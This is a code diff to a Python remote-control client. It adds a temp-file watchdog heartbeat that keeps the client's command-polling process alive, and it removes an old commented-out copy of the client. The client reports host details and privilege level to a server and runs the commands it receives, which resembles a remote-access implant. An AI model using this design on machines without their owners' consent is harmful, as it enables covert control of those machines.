@@ -1,8 +1,10 @@
+import json
 import os
 import platform
 import queue
 import socket
 import sys
+import tempfile
 import threading
 import time
 import uuid
@@ -11,6 +13,9 @@ from client.commands.services.session_control_service import SessionControlServi
 from client.config.config import (
     CONTROL_POLLER_BACKEND,
     CONTROL_POLL_INTERVAL_SECONDS,
+    LOCAL_WATCHDOG_ENABLED,
+    LOCAL_WATCHDOG_HEARTBEAT_INTERVAL_SECONDS,
+    LOCAL_WATCHDOG_TIMEOUT_SECONDS,
     RECONNECT_INTERVAL_SECONDS,
     SERVER_ADDR,
     UPLOAD_BASE_URL,
@@ -48,6 +53,9 @@ class Client:
         self._control_stop_event = threading.Event()
         self._control_poller = None
         self._control_watchdog_process = None
+
+        self._watchdog_heartbeat_stop_event = threading.Event()
+        self._watchdog_heartbeat_thread = None
 
         self._create_connection()
         self._start_control_poller()
@@ -97,6 +105,66 @@ class Client:
         self._clear_receiver_error()
         self._receiver_thread = None
 
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _build_watchdog_heartbeat_file_path(self):
+        return os.path.join(tempfile.gettempdir(), f'client_watchdog_heartbeat_{self.client_id}.json')
+
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _build_watchdog_log_file_path(self):
+        return os.path.join(tempfile.gettempdir(), f'client_watchdog_{self.client_id}.log')
+
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _write_watchdog_heartbeat(self):
+        heartbeat_file_path = self._build_watchdog_heartbeat_file_path()
+        temp_file_path = f'{heartbeat_file_path}.tmp'
+
+        os.makedirs(os.path.dirname(heartbeat_file_path), exist_ok=True)
+        payload = {
+            'ts': time.time(),
+            'pid': os.getpid(),
+            'client_id': self.client_id,
+        }
+
+        with open(temp_file_path, 'w', encoding='utf-8') as file_obj:
+            json.dump(payload, file_obj)
+
+        os.replace(temp_file_path, heartbeat_file_path)
+
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _watchdog_heartbeat_loop(self):
+        while not self._watchdog_heartbeat_stop_event.is_set():
+            try:
+                self._write_watchdog_heartbeat()
+            except Exception as e:
+                logger.error(f'Failed to write watchdog heartbeat: {e}', exc_info=True)
+
+            self._watchdog_heartbeat_stop_event.wait(LOCAL_WATCHDOG_HEARTBEAT_INTERVAL_SECONDS)
+
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _start_watchdog_heartbeat_feeder(self):
+        if CONTROL_POLLER_BACKEND != 'process':
+            return
+
+        if not LOCAL_WATCHDOG_ENABLED:
+            return
+
+        if self._watchdog_heartbeat_thread is not None and self._watchdog_heartbeat_thread.is_alive():
+            return
+
+        self._watchdog_heartbeat_stop_event.clear()
+        self._write_watchdog_heartbeat()
+
+        self._watchdog_heartbeat_thread = threading.Thread(
+            target=self._watchdog_heartbeat_loop,
+            name='LocalWatchdogHeartbeat',
+            daemon=True,
+        )
+        self._watchdog_heartbeat_thread.start()
+
+    # add 本地watchdog心跳 2026-04-10 00:00
+    def _stop_watchdog_heartbeat_feeder(self):
+        self._watchdog_heartbeat_stop_event.set()
+
     # add HTTP 控制轮询线程 2026-04-10 00:00
     def _handle_http_control_command(self, command: str):
         logger.warning(f'Executing HTTP control command: {command}')
@@ -105,6 +173,8 @@ class Client:
     # add HTTP 控制轮询线程 2026-04-10 00:00
     def _start_control_poller(self):
         if CONTROL_POLLER_BACKEND == 'process':
+            self._start_watchdog_heartbeat_feeder()
+
             if self._control_watchdog_process is not None:
                 return
 
@@ -112,6 +182,10 @@ class Client:
                 base_url=UPLOAD_BASE_URL,
                 client_id=self.client_id,
                 poll_interval=CONTROL_POLL_INTERVAL_SECONDS,
+                heartbeat_file_path=self._build_watchdog_heartbeat_file_path(),
+                watchdog_log_file_path=self._build_watchdog_log_file_path(),
+                local_watchdog_enabled=LOCAL_WATCHDOG_ENABLED,
+                local_watchdog_timeout_seconds=LOCAL_WATCHDOG_TIMEOUT_SECONDS,
             )
             self._control_watchdog_process.start()
             return
@@ -131,6 +205,8 @@ class Client:
     # add HTTP 控制轮询线程 2026-04-10 00:00
     def _stop_control_poller(self):
         self._control_stop_event.set()
+        self._stop_watchdog_heartbeat_feeder()
+
         if self._control_poller is not None:
             self._control_poller.stop()
         if self._control_watchdog_process is not None:
@@ -299,281 +375,3 @@ if __name__ == '__main__':
     except Exception as e:
         client._stop_control_poller()
         logger.error(e, exc_info=True)
-
-
-# import os
-# import platform
-# import queue
-# import socket
-# import sys
-# import threading
-# import time
-# import uuid
-#
-# from client.commands.services.session_control_service import SessionControlService
-# from client.config.config import (
-#     CONTROL_POLL_INTERVAL_SECONDS,
-#     RECONNECT_INTERVAL_SECONDS,
-#     SERVER_ADDR,
-#     UPLOAD_BASE_URL,
-# )
-# from core.utils.client_util import check_privilege, get_system_paths
-# from client.connection.http_control_poller import HttpControlPoller
-# from client.connection.server_connection import ServerConnection
-# from core.utils.logger import logger
-#
-# # 强制导入所有平台模块，让 PyInstaller 检测到
-# import client.commands.platform.mac
-# if os.name == 'nt':
-#     import client.commands.platform.win
-# import client.commands.platform.linux
-#
-#
-# class Client:
-#     RECONNECT_INTERVAL = RECONNECT_INTERVAL_SECONDS
-#
-#     def __init__(self, address):
-#         self.address = address
-#         self.client_id = str(uuid.uuid4())
-#         self.server = None
-#
-#         self._receiver_thread = None
-#         self._receiver_stop_event = threading.Event()
-#         self._receiver_error = None
-#         self._receiver_error_lock = threading.Lock()
-#
-#         self._control_stop_event = threading.Event()
-#         self._control_poller = None
-#
-#         self._create_connection()
-#         self._start_control_poller()
-#
-#     def _create_connection(self):
-#         """
-#         创建一个新的服务端连接对象
-#         """
-#         self.server = ServerConnection()
-#         self.server.client_id = self.client_id
-#
-#     def _close_current_connection(self):
-#         """
-#         关闭当前连接
-#         """
-#         try:
-#             self.server.close()
-#         except Exception:
-#             pass
-#
-#     def _clear_receiver_error(self):
-#         with self._receiver_error_lock:
-#             self._receiver_error = None
-#
-#     def _set_receiver_error(self, error):
-#         with self._receiver_error_lock:
-#             if self._receiver_error is None:
-#                 self._receiver_error = error
-#
-#     def _pop_receiver_error(self):
-#         with self._receiver_error_lock:
-#             error = self._receiver_error
-#             self._receiver_error = None
-#             return error
-#
-#     def _stop_receiver_thread(self):
-#         """
-#         停止接收线程
-#         """
-#         self._receiver_stop_event.set()
-#
-#     def _reset_receiver_runtime(self):
-#         """
-#         重置接收线程运行态
-#         """
-#         self._receiver_stop_event = threading.Event()
-#         self._clear_receiver_error()
-#         self._receiver_thread = None
-#
-#     # add HTTP 控制轮询线程 2026-04-10 00:00
-#     def _handle_http_control_command(self, command: str):
-#         logger.warning(f'Executing HTTP control command: {command}')
-#         SessionControlService(self.server).execute_control_command(command)
-#
-#     # add HTTP 控制轮询线程 2026-04-10 00:00
-#     def _start_control_poller(self):
-#         if self._control_poller is not None:
-#             return
-#
-#         self._control_poller = HttpControlPoller(
-#             base_url=UPLOAD_BASE_URL,
-#             client_id=self.client_id,
-#             command_handler=self._handle_http_control_command,
-#             poll_interval=CONTROL_POLL_INTERVAL_SECONDS,
-#             stop_event=self._control_stop_event,
-#         )
-#         self._control_poller.start()
-#
-#     # add HTTP 控制轮询线程 2026-04-10 00:00
-#     def _stop_control_poller(self):
-#         self._control_stop_event.set()
-#         if self._control_poller is not None:
-#             self._control_poller.stop()
-#
-#     def _reset_connection(self):
-#         """
-#         关闭当前连接并重建连接对象
-#         """
-#         self._stop_receiver_thread()
-#         self._close_current_connection()
-#         self._handle_connection_lost()
-#         self._reset_receiver_runtime()
-#         self._create_connection()
-#
-#     def _build_client_info(self):
-#         """
-#         构造客户端基础信息
-#         """
-#         command_manifest = []
-#         try:
-#             commands = self.server.command_executor.get_commands()
-#             if hasattr(commands, 'get_command_manifest_payload'):
-#                 command_manifest = commands.get_command_manifest_payload()
-#         except Exception:
-#             command_manifest = []
-#
-#         return {
-#             'id': self.client_id,
-#             'type': 'info',
-#             'os_type': platform.system(),
-#             'os_ver': platform.platform(),
-#             'hostname': socket.gethostname(),
-#             'integrity': check_privilege(),
-#             'cwd': os.getcwd(),
-#             'command_manifest': command_manifest,
-#             'system_paths': get_system_paths(),
-#         }
-#
-#     def _connect_socket(self):
-#         """
-#         建立到底层服务端的连接；失败时持续重试
-#         """
-#         logger.info(f'Connecting to {self.address}')
-#
-#         while not self.server.connect(self.address):
-#             time.sleep(self.RECONNECT_INTERVAL)
-#             print('Attempting to reconnect...')
-#             self._create_connection()
-#
-#     def _handshake(self):
-#         """
-#         连接建立后发送客户端握手信息
-#         """
-#         info = self._build_client_info()
-#         self.server.send(info)
-#         self.server.mark_connected()
-#         logger.info('Connected')
-#
-#     def _receiver_loop(self):
-#         """
-#         后台接收线程：
-#         - 持续 recv 收包
-#         - 由 ServerConnection 统一决定如何处理消息
-#         """
-#         while not self._receiver_stop_event.is_set():
-#             try:
-#                 self.server.recv_message()
-#             except socket.error as e:
-#                 if not self._receiver_stop_event.is_set():
-#                     self._set_receiver_error(e)
-#                 break
-#             except Exception as e:
-#                 if not self._receiver_stop_event.is_set():
-#                     self._set_receiver_error(e)
-#                 break
-#
-#     def _start_receiver_thread(self):
-#         """
-#         启动后台接收线程
-#         """
-#         self._receiver_stop_event.clear()
-#         self._clear_receiver_error()
-#
-#         self._receiver_thread = threading.Thread(
-#             target=self._receiver_loop,
-#             name='ClientReceiver',
-#             daemon=True
-#         )
-#         self._receiver_thread.start()
-#
-#     def connect(self):
-#         """
-#         建立连接并完成握手
-#         """
-#         self._start_control_poller()
-#         self._connect_socket()
-#         self._handshake()
-#         self._start_receiver_thread()
-#
-#     def _recover_from_connection_error(self, error):
-#         """
-#         连接异常后的恢复逻辑
-#         """
-#         logger.error(error, exc_info=True)
-#         self._reset_connection()
-#         self.connect()
-#
-#     def wait(self):
-#         while True:
-#             try:
-#                 receiver_error = self._pop_receiver_error()
-#                 if receiver_error is not None:
-#                     raise receiver_error
-#
-#                 result = self.server.recv_command(timeout=0.5)
-#                 if result:
-#                     self.server.send_result(*result)
-#             except queue.Empty:
-#                 continue
-#             except SystemExit:
-#                 logger.info('Server closed this connection')
-#                 break
-#             except socket.error as e:
-#                 self._recover_from_connection_error(e)
-#             except Exception as e:
-#                 self._recover_from_connection_error(e)
-#
-#     def _handle_connection_lost(self):
-#         """
-#         连接断开时的统一清理逻辑：
-#         - 先标记连接失效
-#         - 停掉所有后台任务
-#         - 清掉旧连接运行态
-#         """
-#         try:
-#             self.server.mark_disconnected()
-#         except Exception:
-#             pass
-#
-#         try:
-#             stopped_jobs = self.server.job_manager.handle_connection_lost()
-#             if stopped_jobs:
-#                 logger.info(f'Stopped background jobs after connection loss: {stopped_jobs}')
-#         except Exception as e:
-#             logger.error(f'Failed to stop background jobs after connection loss: {e}', exc_info=True)
-#
-#         try:
-#             self.server.reset_runtime_state()
-#         except Exception as e:
-#             logger.error(f'Failed to reset runtime state after connection loss: {e}', exc_info=True)
-#
-#
-# if __name__ == '__main__':
-#     client = Client(SERVER_ADDR)
-#     try:
-#         client.connect()
-#         client.wait()
-#     except KeyboardInterrupt:
-#         client._stop_control_poller()
-#         sys.exit(0)
-#     except Exception as e:
-#         client._stop_control_poller()
-#         logger.error(e, exc_info=True)
